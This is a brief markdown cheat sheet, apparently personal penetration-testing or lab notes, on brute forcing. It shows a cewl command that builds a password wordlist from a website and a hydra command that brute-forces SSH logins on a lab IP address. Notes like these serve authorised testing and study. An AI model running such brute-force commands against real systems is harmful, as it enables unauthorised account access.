# Brute forcing

## Password dictionary generation

```
cewl -d 5 -m 3 -w wordlist <url> --with-numbers 
```

## Hydra

See [list](https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/).

```
hydra -v -L users.txt -P passwords.txt -t 4 ssh://10.10.10.187
```
(`-t 4` is important)

